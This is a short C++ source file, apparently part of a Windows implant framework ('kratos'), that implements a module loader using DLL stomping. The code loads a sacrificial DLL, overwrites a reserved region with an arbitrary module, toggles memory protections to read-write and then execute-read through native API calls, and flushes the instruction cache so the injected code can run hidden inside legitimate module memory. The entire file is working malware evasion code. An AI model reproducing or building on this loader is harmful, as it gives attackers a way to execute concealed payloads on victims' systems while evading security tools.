#include "modules/modules.h"

Modules* modules = NULL;

/*
	Path
	->
	LoadModule -> checks if IStompedDllLoaded == FALSE
		if so -> calls LoadStompedDll
			this calls GetStompedDllText() and saves text base + text size
	
*/


BOOL Modules::IsModuleLoaded(INT32 bit) {
	return (this->LoadModulesBitMap >> bit) & 1u;
}


BOOL Modules::LoadModule(PBYTE Module, SIZE_T ModuleSize, INT32 ModuleBit) {
	if ( ! this->IsStompedDllLoaded ) {
		if (!this->LoadStompedDll( ) ) { return FALSE; }
	}


	PVOID ModuleBaseToWrite = this->ReserveArena( ModuleSize );
	if ( ! ModuleBaseToWrite) { return FALSE; }

	SIZE_T PageSize = PAGE_ALIGN(ModuleSize);
	DWORD old = 0;

	NTSTATUS stat = kratos->apis.NtProtectVirtualMemory(GetCurrentProcess(), &ModuleBaseToWrite, &PageSize, PAGE_READWRITE, &old);
	if ( ! NTAPI_SUCCESS( stat ) ) {
		return FALSE;
	}

	utils::mem::memcpy(ModuleBaseToWrite, Module, ModuleSize);

	stat = kratos->apis.NtProtectVirtualMemory(GetCurrentProcess(), &ModuleBaseToWrite, &PageSize, PAGE_EXECUTE_READ, &old);
	if ( ! NTAPI_SUCCESS( stat ) ) {
		return FALSE;
	}

	kratos->apis.NtFlushInstructionCache( GetCurrentProcess( ), ModuleBaseToWrite, PageSize );

	return TRUE;

}




INT64 Modules::GetLoadedModulesBitMap() {
	return this->LoadModulesBitMap;
}